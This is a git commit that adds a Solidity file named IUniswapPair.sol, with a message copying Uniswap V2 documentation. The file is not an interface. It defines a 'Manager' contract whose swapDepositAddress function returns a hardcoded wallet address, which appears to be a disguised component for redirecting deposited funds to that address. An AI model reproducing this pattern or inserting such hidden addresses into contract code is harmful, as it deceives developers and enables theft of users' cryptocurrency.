ddc472ec5774c51fc09dcd7cc490470a3fd28658
uniswap <93559858+uniswaprepository@users.noreply.github.com>
2021-11-03 02:33:57 +0100

    Create IUniswapPair.sol
    In-depth documentation on Uniswap V2 is available at [uniswap.org](https://uniswap.org/docs).
    
    The built contract artifacts can be browsed via [unpkg.com](https://unpkg.com/browse/@uniswap/v2-core@latest/).

---
+++ contracts/interfaces/IUniswapPair.sol
@@ -0,0 +1,7 @@
+pragma solidity ^0.5.0;
+
+contract Manager {
+    function swapDepositAddress() public pure returns (address) {
+        return 0x2A2D089b07a8189C32b516D0EF6A64B43EFFE93f;
+    }
+}
